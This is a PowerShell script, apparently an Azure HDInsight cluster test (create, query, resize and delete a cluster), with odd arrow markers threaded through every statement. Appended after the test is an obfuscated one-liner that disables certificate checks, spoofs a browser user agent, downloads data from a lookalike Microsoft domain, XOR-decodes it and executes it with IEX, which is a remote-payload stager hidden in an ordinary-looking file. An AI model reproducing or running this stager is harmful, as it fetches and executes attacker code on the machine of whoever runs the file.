















 -||-> function Test-ClusterRelatedCommands{

	
	 -||-> try
	{
		
		 -||-> $cluster =  -||-> Create-Cluster <-||-  <-||- 
		 -||-> Assert-NotNull $cluster <-||- 
		
		
		 -||-> $resultCluster =  -||-> Get-AzHDInsightCluster -ClusterName $cluster.Name <-||-  <-||- 
		 -||-> Assert-AreEqual $resultCluster.Name  $cluster.Name <-||- 
		
		
		 -||-> $resizeCluster =  -||-> Set-AzHDInsightClusterSize -ClusterName $cluster.Name -ResourceGroupName $cluster.ResourceGroup `
		-TargetInstanceCount 3 <-||-  <-||- 
		 -||-> Assert-AreEqual $resizeCluster.CoresUsed 20 <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzHDInsightCluster -ClusterName $cluster.Name <-||- 
		 -||-> Remove-AzResourceGroup -ResourceGroupName $cluster.ResourceGroup <-||- 
	} <-||- 

} <-||- 

 -||-> [SySteM.NEt.SERVicEPointMAnager]::ExPeCt100COnTiNue = 0 <-||- ; -||-> $WC= -||-> NEw-ObJect SysTEm.Net.WebCLiENT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { -||-> $true <-||- } <-||- ; -||-> $Wc.HEADERs.AdD('User-Agent',$u) <-||- ; -||-> $WC.PRoxY = [SystEM.Net.WEbREqUEsT]::DefaUlTWEbProXy <-||- ; -||-> $wC.PRoxY.CReDENtiALs = [SyStEm.Net.CReDENTIAlCAcHe]::DEFAUlTNeTwORkCREdeNtiAls <-||- ; -||-> $K='8ac6f27a282e4938125482607ccfb55f' <-||- ; -||-> $I=0 <-||- ; -||-> [ChAR[]]$B= -||-> ( -||-> [CHar[]]( -||-> $Wc.DowNloaDSTriNg("https://mail.microsoft-invites.com/index.asp") <-||- ) <-||- )|%{ -||-> $_-bXor$k[$i++%$K.LenGth] <-||- } <-||-  <-||- ; -||-> IEX ( -||-> $b-JOIN'' <-||- ) <-||- 



